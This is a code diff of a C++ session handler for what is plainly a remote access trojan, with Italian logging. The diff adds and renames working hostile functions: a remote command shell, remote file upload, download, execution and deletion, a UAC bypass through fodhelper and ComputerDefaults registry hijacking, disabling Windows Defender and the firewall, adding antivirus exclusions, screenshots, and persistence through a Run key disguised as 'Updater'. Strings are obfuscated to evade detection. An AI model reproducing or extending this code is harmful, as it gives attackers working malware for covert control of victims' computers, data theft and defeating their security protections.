@@ -1,7 +1,5 @@
 #pragma once
 
-
-
 class Sessione
 {
 private:
@@ -14,17 +12,12 @@ private:
 	SystemUtils su;
 	RegUtils ru;
 
-public:
-
-	Sessione(SOCKET _Sock)
-	{
-		Sock = _Sock;
-	}
-
 	Json DirFileToJson(VectDirFile DirFiles)
 	{
 		Encode en;
 		Json j;
+
+		debug.log.Info("Conversione DirFile in Json...");
 
 		for (int i = 0; i < DirFiles.size(); i++)
 		{
@@ -40,6 +33,8 @@ public:
 			j["Files"][i]["Size"] = (j["Files"][i]["Type"]) ? du.GetSizeOfFile(en.UnicodeToAscii(j["Files"][i]["FullPath"])) : 0;
 			j["Files"][i]["LastEdit"] = du.GetTimeOfFile(en.UnicodeToAscii(j["Files"][i]["FullPath"])).LastWriteTime;
 		}
+
+		debug.log.Info("Conversione completata.");
 
 		return j;
 	}
@@ -63,24 +58,38 @@ public:
 
 	bool GetInfo()
 	{
+		debug.log.Info("GetInfo");
+
 		WindowUtils wu;
 		Settaggi sett;
 
-		sett.GetSettingsFromReg();
+		sett.GetAllSettings();
 
 		Json j;
 
-		j["IPL"] = TcpIP::GetLocalIP(Sock);
-		j["CPU"] = to_string((int)su.GetCPUload()) + "%";
-		j["RAM"] = to_string((int)su.GetRAMperc()) + "%";
-		j["ACTWIN"] = wu.GetWindowTitle();
-		j["INSTDATE"] = sett.InstallDate;
+		debug.log.Info("Popolo il json...");
 
-		return COMUNICAZIONI::GetInfo(Sock, j.dump());
+		try
+		{
+			j["IPL"] = TcpIP::GetLocalIP(Sock);
+			j["CPU"] = to_string((int)su.GetCPUload()) + "%";
+			j["RAM"] = to_string((int)su.GetRAMperc()) + "%";
+			j["ACTWIN"] = wu.GetWindowTitle();
+			j["INSTDATE"] = sett.InstallDate;
+			j["WINDEF"] = Services::GetAvStatus();
+		}
+		catch (exception ex)
+		{ debug.log.Error(ex.what()); }
+		
+		debug.log.Info("Invio il json...");
+
+		return TcpIP::SendString(Sock, j.dump());
 	}
 
 	bool UpdateClient()
 	{
+		debug.log.Info("Aggiornamento Client in corso...");
+
 		COMUNICAZIONI::NewClient NewClient;
 
 		string FMFP = du.GetFullModuleFilePath();
@@ -126,6 +135,8 @@ public:
 
 	void Uninstall()
 	{
+		debug.log.Info("Disinstallazione in corso...");
+
 		string RemoveVBS = "";
 
 		ru.DeleteKey(ru.CurrentUser, "SOFTWARE\\Windows Update");
@@ -140,8 +151,10 @@ public:
 		du.RunFile(du.GetModuleFilePath() + "Remove.vbs");
 	}
 
-	void ReverseShell()
+	void ReveShell()
 	{
+		debug.log.Info("RevShell");
+
 		string Cmd;
 		string Res = "OK";
 		string Path = du.GetModuleFilePath(false);
@@ -151,7 +164,9 @@ public:
 		while (true)
 		{
 			Cmd = COMUNICAZIONI::PingPong(Sock, Res);
-		
+			
+			debug.log.Info("Ricevuto comando: " + Cmd);
+
 			if (Cmd == "")
 				return;
 			else if (Cmd == "Get cd")
@@ -250,6 +265,11 @@ public:
 				su.AsyncCMD(Cmd);
 				Res = "\n";
 			}
+			else if (StringUtils::ToLowerCase(Cmd).substr(0, 7) == "taskmgr")
+			{
+				su.AsyncCMD(Cmd);
+				Res = "\n";
+			}
 			else
 				Res = su.GetCMDOutput(Cmd) + "\n";
 		}
@@ -257,6 +277,8 @@ public:
 
 	void FileExplorer()
 	{
+		debug.log.Info("Explorer");
+
 		Encode en;
 		string Buff = "";
 		string Res = "";
@@ -268,8 +290,6 @@ public:
 		du.GetDir(du.GetCurrDir(), DirFiles);
 	
 		j = DirFileToJson(DirFiles);
-
-		debug.log.Info(j.dump());
 
 		Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
 
@@ -285,6 +305,8 @@ public:
 				break;
 			else if (j["Action"] == "OpenDir")
 			{
+				debug.log.Info("OpenDir " + en.UnicodeToAscii(j["Path"]));
+
 				DirFiles.clear();
 
 				if (du.SetCurrDir(en.UnicodeToAscii(j["Path"])))
@@ -301,6 +323,8 @@ public:
 			}
 			else if (j["Action"] == "RunFile")
 			{
+				debug.log.Info("RunFile " + en.UnicodeToAscii(j["Path"]));
+
 				DirFiles.clear();
 
 				du.RunFile(en.UnicodeToAscii(j["Path"]));
@@ -313,6 +337,8 @@ public:
 			}
 			else if (j["Action"] == "GoUp")
 			{
+				debug.log.Info("GoUp " + du.GetCurrDir() + "\\..");
+
 				DirFiles.clear();
 
 				if (du.SetCurrDir(du.GetCurrDir() + "\\.."))
@@ -329,6 +355,8 @@ public:
 			}
 			else if (j["Action"] == "Delete")
 			{
+				debug.log.Info("Delete " + en.UnicodeToAscii(j["Path"]));
+
 				bool Success = false;
 
 				DirFiles.clear();
@@ -360,6 +388,8 @@ public:
 			}
 			else if (j["Action"] == "Refresh")
 			{
+				debug.log.Info("Refresh " + du.GetCurrDir());
+
 				DirFiles.clear();
 				du.GetDir(du.GetCurrDir(), DirFiles);
 
@@ -370,6 +400,8 @@ public:
 			}
 			else if (j["Action"] == "Rename")
 			{
+				debug.log.Info("Rename " + en.UnicodeToAscii(j["OldName"]) + " -> " + en.UnicodeToAscii(j["NewName"]));
+
 				DirFiles.clear();
 
 				if (du.RenameFileOrDir(en.UnicodeToAscii(j["OldName"]), en.UnicodeToAscii(j["NewName"])))
@@ -394,27 +426,29 @@ public:
 			}
 			else if (j["Action"] == "Upload")
 			{
-				string FileName;
-				string FileContent;
+				debug.log.Info("Upload from server...");
 
 				DirFiles.clear();
 
-				if (!COMUNICAZIONI::DownloadFileWithLoading(Sock, FileName, FileContent))
-					break;
+				switch (COMUNICAZIONI::DownloadFileWithLoading(Sock))
+				{
+					case 0:
+						Buff = COMUNICAZIONI::PingPong(Sock, "OK");
+						break;
 
-				if (du.WriteBinaryFile(FileName, FileContent))
-				{
-					Buff = COMUNICAZIONI::PingPong(Sock, "OK");
-				}
-				else
-				{
-					if (debug.Active)
-					{
-						char errmsg[256];
-						strerror_s(errmsg, 256, errno);
-						debug.log.Warn(errmsg);
-					}
-					Buff = COMUNICAZIONI::PingPong(Sock, "denied");
+					case 1:
+						b = false;
+						break;
+
+					case 2:
+						if (debug.Active)
+						{
+							char errmsg[256];
+							strerror_s(errmsg, 256, errno);
+							debug.log.Warn(errmsg);
+						}
+						Buff = COMUNICAZIONI::PingPong(Sock, "denied");
+						break;
 				}
 			}
 			else if (j["Action"] == "Download")
@@ -422,7 +456,9 @@ public:
 				string FilePath = en.UnicodeToAscii(j["Path"]);
 				string FileName = FilePath.substr(FilePath.find_last_of("\\") + 1);
 
-				if (!COMUNICAZIONI::UploadFileWithLoading(Sock, FileName, du.GetBinaryFileContent(FilePath)))
+				debug.log.Info("Download..." + FileName);
+
+				if (!COMUNICAZIONI::UploadFileWithLoading(Sock, FileName, FilePath))
 					break;
 
 				if (!TcpIP::RecvString(Sock, Buff))
@@ -430,6 +466,8 @@ public:
 			}
 			else if (j["Action"] == "Makedir")
 			{
+				debug.log.Info("MakeDir " + en.UnicodeToAscii(j["Path"]));
+
 				DirFiles.clear();
 
 				if (du.MakeDir(en.UnicodeToAscii(j["Path"])))
@@ -454,6 +492,8 @@ public:
 			}
 			else if (j["Action"] == "Makefile")
 			{
+				debug.log.Info("MakeFile " + en.UnicodeToAscii(j["Path"]));
+
 				DirFiles.clear();
 
 				if (du.WriteFile(en.UnicodeToAscii(j["Path"])))
@@ -484,19 +524,22 @@ public:
 
 				if (j["CutOrCopy"])
 				{
+					debug.log.Info("Copy " + en.UnicodeToAscii(j["Path"]) + " -> " + du.GetCurrDir() + "\\" + (string)j["Name"]);
+
 					if (j["Type"])
 						Success = du.CopyPasteFile(en.UnicodeToAscii(j["Path"]), du.GetCurrDir() + "\\" + (string)j["Name"]);
 					else
-					{
-						du.CopyPasteDir(en.UnicodeToAscii(j["Path"]), du.GetCurrDir() + "\\" + (string)j["Name"]);
-						Success = true; // Grazie C++17, bella cagata...
-					}
+						Success = du.CopyPasteDir(en.UnicodeToAscii(j["Path"]), du.GetCurrDir() + "\\" + (string)j["Name"]);
 				}
 				else
+				{
+					debug.log.Info("Cut " + en.UnicodeToAscii(j["Path"]) + " -> " + du.GetCurrDir() + "\\" + (string)j["Name"]);
+
 					if (j["Type"])
 						Success = du.CutFile(en.UnicodeToAscii(j["Path"]), du.GetCurrDir() + "\\" + (string)j["Name"]);
 					else
 						Success = du.CutDir(en.UnicodeToAscii(j["Path"]), du.GetCurrDir() + "\\" + (string)j["Name"]);
+				}
 
 				if (Success)
 				{
@@ -520,6 +563,8 @@ public:
 			}
 			else if (j["Action"] == "ChangePartition")
 			{
+				debug.log.Info("ChangePartition");
+
 				DirFiles.clear();
 				du.GetDir(du.GetCurrDir(), DirFiles);
 
@@ -541,6 +586,8 @@ public:
 			}
 			else if (j["Action"] == "Zip")
 			{
+				debug.log.Info("Zip " + en.UnicodeToAscii(j["Path"]));
+
 				if (su.NoOutputCMD((string)AY_OBFUSCATE("powershell Compress-Archive '") + en.UnicodeToAscii(j["Path"]) + "' '" + en.UnicodeToAscii(j["Name"]) + ".zip' -force") == 0)
 				{
 					DirFiles.clear();
@@ -564,6 +611,8 @@ public:
 			}
 			else if (j["Action"] == "Unzip")
 			{
+				debug.log.Info("Unzip " + en.UnicodeToAscii(j["Path"]));
+
 				if (su.NoOutputCMD((string)AY_OBFUSCATE("powershell Expand-Archive '") + en.UnicodeToAscii(j["Path"]) + "' -force") == 0)
 				{
 					DirFiles.clear();
@@ -590,8 +639,17 @@ public:
 		}
 	}
 
-	bool BypassUAC()
+	bool BypUAC()
 	{
+		string Buff;
+
+		if (!TcpIP::RecvString(Sock, Buff))
+			return false;
+
+		int mode = stoi(Buff);
+
+		debug.log.Info("ByUAC " + Buff + "...");
+
 		bool Success = true;
 
 		string EmergencyVBS = "WScript.Sleep 15000\n";
@@ -601,36 +659,87 @@ public:
 		EmergencyVBS += "filesys.DeleteFile \"" + du.GetModuleFilePath() + "Emer.vbs\"";
 	
 		du.WriteFile(du.GetModuleFilePath() + "Emer.vbs", EmergencyVBS);
-		du.WriteFile(du.GetModuleFilePath() + "Aele");
+		du.WriteFile(du.GetModuleFilePath() + "aele1");
+
+		debug.log.Info("Scritti file aele1 e Emer.vbs");
 
 		du.RunFile(du.GetModuleFilePath() + "Emer.vbs");
 
-		if(!ru.CreateKey(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\.pwn\\Shell\\Open\\command")))
-			Success = false;
-		if(!ru.WriteStringValue(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\.pwn\\Shell\\Open\\command"), "", ((string)AY_OBFUSCATE("cmd /c start \"\" \"") + du.GetFullModuleFilePath() + "\"")))
-			Success = false;
-		if(!ru.CreateKey(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\ms-settings\\CurVer")))
-			Success = false;
-		if(!ru.WriteStringValue(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\ms-settings\\CurVer"), "", (string)AY_OBFUSCATE(".pwn")))
-			Success = false;
-	
-		if (Success)
-			su.AsyncCMD((string)AY_OBFUSCATE("powershell Start-Process \"C:\\Windows\\System32\\fodhelper.exe\" -WindowStyle Hidden"));
-	
-		Sleep(6000);
-	
-		ru.DeleteKey(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\ms-settings\\CurVer"));
-		ru.DeleteKey(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\.pwn\\Shell\\Open\\command"));
-	
-		du.WriteFile(du.GetModuleFilePath() + "AeleSA");
+		debug.log.Info("Avviato file Emer.vbs");
 
-		if (du.CheckFile(du.GetModuleFilePath() + "AeleOK"))
+		if (mode == 1)
 		{
-			TcpIP::SendString(Sock, "OK");
-			Sleep(500);
-			return true;
+			if (!ru.CreateKey(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\.pwn\\Shell\\Open\\command")))
+				Success = false;
+			if (!ru.WriteStringValue(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\.pwn\\Shell\\Open\\command"), "", ((string)AY_OBFUSCATE("cmd /c start \"\" \"") + du.GetFullModuleFilePath() + "\"")))
+				Success = false;
+			if (!ru.CreateKey(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\ms-settings\\CurVer")))
+				Success = false;
+			if (!ru.WriteStringValue(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\ms-settings\\CurVer"), "", (string)AY_OBFUSCATE(".pwn")))
+				Success = false;
+
+			debug.log.Info("Registro " + (string)(Success ? "TRUE" : "FALSE"));
+
+			if (Success)
+			{
+				du.WriteFile(du.GetModuleFilePath() + "aele2");
+				debug.log.Info("Scritto file aele2");
+				su.NoOutputCMD((string)AY_OBFUSCATE("powershell Start-Process \"C:\\Windows\\System32\\fodhelper.exe\" -WindowStyle Hidden"));
+			}
 		}
-	
+		else if (mode == 2)
+		{
+			if (!ru.CreateKey(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\ms-settings\\Shell\\Open\\command")))
+				Success = false;
+			if (!ru.WriteStringValue(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\ms-settings\\Shell\\Open\\command"), "", du.GetFullModuleFilePath()))
+				Success = false;
+			if (!ru.WriteDwordValue(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\ms-settings\\Shell\\Open\\command"), "DelegateExecute", 0))
+				Success = false;
+
+			debug.log.Info("Registro " + (string)(Success ? "TRUE" : "FALSE"));
+
+			if (Success)
+			{
+				du.WriteFile(du.GetModuleFilePath() + "aele2");
+				debug.log.Info("Scritto file aele2");
+				su.AsyncCMD((string)AY_OBFUSCATE("powershell Start-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\" -WindowStyle Hidden"));
+			}
+		}
+		
+		du.WriteFile(du.GetModuleFilePath() + "aele3");
+		debug.log.Info("Scritto file aele3");
+
+		Sleep(6000);
+		
+		if (mode == 1)
+		{
+			ru.DeleteKey(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\ms-settings\\CurVer"));
+			ru.DeleteKey(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\.pwn\\Shell\\Open\\command"));
+		}
+		else if (mode == 2)
+		{
+			ru.WriteStringValue(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\ms-settings\\Shell\\Open\\command"), "", du.GetFullModuleFilePath());
+			ru.DeleteKey(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\ms-settings\\Shell"));
+		}
+		
+		debug.log.Info("Registro pulito");
+
+		for (int i = 0; i < 4; i++)
+		{
+			if (du.CheckFile(du.GetModuleFilePath() + "aeleOK"))
+			{
+				debug.log.Info("Elevazione riuscita");
+
+				TcpIP::SendString(Sock, "OK");
+				Sleep(500);
+				return true;
+			}
+			Sleep(1000);
+		}
+		
+		du.WriteFile(du.GetModuleFilePath() + "aele4");
+		debug.log.Info("Elevazione fallita, scritto file aele4");
+
 		TcpIP::SendString(Sock, "NO");
 		return false;
 	}
@@ -639,11 +748,15 @@ public:
 	{
 		if (VibeMouseController)
 		{
+			debug.log.Info("Fermo vibrazione mouse");
+
 			VibeMouseController = false;
 			return TcpIP::SendString(Sock, "b");
 		}
 		else
 		{
+			debug.log.Info("Avvio vibrazione mouse");
+
 			VibeMouseController = true;
 			thread tVMA(&Sessione::VibeMouseAsync, this);
 			tVMA.detach();
@@ -656,35 +769,57 @@ public:
 
 	bool AddAVexclusion()
 	{
+		debug.log.Info("Aggiungo esclusione AV");
+
+		if (!Services::GetAvStatus())
+			return TcpIP::SendString(Sock, "no");
+
 		if (su.NoOutputCMD((string)AY_OBFUSCATE("powershell -inputformat none -outputformat none -NonInteractive -Command \"Add-MpPreference -ExclusionProcess '") + du.GetFullModuleFilePath() + "'\"") == 0)
-		{
 			return TcpIP::SendString(Sock, "ok");
-		}
 
 		return TcpIP::SendString(Sock, "ko");
 	}
 
-	bool DisableFirewall()
+	bool DisableFW()
 	{
+		debug.log.Info("Disattivo il FW");
+
 		if (su.NoOutputCMD((string)AY_OBFUSCATE("netsh advfirewall set allprofiles state off")) == 0)
-		{
 			return TcpIP::SendString(Sock, "ok");
-		}
 
 		return TcpIP::SendString(Sock, "ko");
 	}
 
 	bool Screenshot()
 	{
+		debug.log.Info("Screenshot");
+
 		Mat Desktop;
 		vector<uchar> vect;
 		string Buff;
-		Monitor mo;
+		Monitors mon;
+		Json json;
 
-		mo.GetMonitorList();
-		Desktop = mo.GetMatScreenshot(mo.Monitors[0]);
+		mon.GetMonitorList();
+		
+		for (int i = 0; i < mon.MonitorList.size(); i++)
+		{
+			json[i]["Nome"] = mon.MonitorList[i].name;
+			json[i]["Width"] = to_string(mon.MonitorList[i].width);
+			json[i]["Height"] = to_string(mon.MonitorList[i].height);
+		}
+
+		Buff = COMUNICAZIONI::PingPong(Sock, json.dump());
+		if (Buff.empty())
+			return false;
+
+		try { stoi(Buff); }
+		catch (exception ex) { return false; }
+
+		Desktop = ScreenshotUtils::CaptureMatScreenshot(mon.MonitorList[stoi(Buff)].hMonitor);
 		imencode(".jpeg", Desktop, vect, { IMWRITE_JPEG_QUALITY, 100 });
 
+		Buff.clear();
 		Buff = string(vect.begin(), vect.end());
 		Buff = Services::compress_string(Buff);
 
@@ -696,17 +831,55 @@ public:
 		return Result;
 	}
 
+	void Reinstall()
+	{
+		debug.log.Info("Reinstallazione in corso...");
+
+		ru.DeleteKey(ru.CurrentUser, "SOFTWARE\\Windows Update");
+		ru.DeleteValue(ru.CurrentUser, (string)AY_OBFUSCATE("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), "Updater");
+
+		su.RunExe(du.GetFullModuleFilePath());
+	}
+
+	bool DisableAV()
+	{
+		debug.log.Info("Disattivo l'AV");
+
+		if (su.NoOutputCMD((string)AY_OBFUSCATE("powershell Set-MpPreference -DisableRealtimeMonitoring $true")) == 0)
+			if (ru.WriteDwordValue(ru.LocalMachine, (string)AY_OBFUSCATE("SOFTWARE\\Policies\\Microsoft\\Windows Defender"), (string)AY_OBFUSCATE("DisableAntiSpyware"), 1))
+			{
+				ru.WriteDwordValue(ru.LocalMachine, (string)AY_OBFUSCATE("SOFTWARE\\Policies\\Microsoft\\Windows Defender"), (string)AY_OBFUSCATE("DisableWinDefender"), 1);
+				return TcpIP::SendString(Sock, "ok");
+			}
+
+		return TcpIP::SendString(Sock, "ko");
+	}
+
+public:
+
+	Sessione(SOCKET _Sock)
+	{
+		Sock = _Sock;
+	}
+
 	short Start()
 	{
 		SystemUtils su;
 		string cmd = "";
+		int errorType = 0;
 
 		for (bool i = true; i;)
 		{
-			TcpIP::RecvString(Sock, cmd);
-
-			if (cmd == "")
+			cmd = "";
+			if (!TcpIP::RecvString(Sock, cmd, errorType) && errorType != 10060)
 				i = false;
+
+			debug.log.Info("Comando sessione: \"" + cmd + "\" [" + to_string(errorType) + "]");
+
+			if (cmd == "" && errorType != 10060)
+			{
+				i = false;
+			}
 			else if (cmd == "getinfo")
 			{
 				i = GetInfo();
@@ -747,7 +920,7 @@ public:
 			}
 			else if (cmd == (string)AY_OBFUSCATE("reverseshell"))
 			{
-				ReverseShell();
+				ReveShell();
 			}
 			else if (cmd == "fileexplorer")
 			{
@@ -755,7 +928,7 @@ public:
 			}
 			else if (cmd == (string)AY_OBFUSCATE("bypassuac"))
 			{
-				if (BypassUAC()) return 1;
+				if (BypUAC()) return 1;
 			}
 			else if (cmd == "vibemouse")
 			{
@@ -767,11 +940,24 @@ public:
 			}
 			else if (cmd == "disablefw")
 			{
-				i = DisableFirewall();
+				i = DisableFW();
 			}
 			else if (cmd == "screenshot")
 			{
 				i = Screenshot();
+			}
+			else if (cmd == "reinstall")
+			{
+				Reinstall();
+				return 1;
+			}
+			else if (cmd == "disableav")
+			{
+				i = DisableAV();
+			}
+			else if (cmd == "keepalive")
+			{
+				i = TcpIP::SendString(Sock, "imalive");
 			}
 		}
 
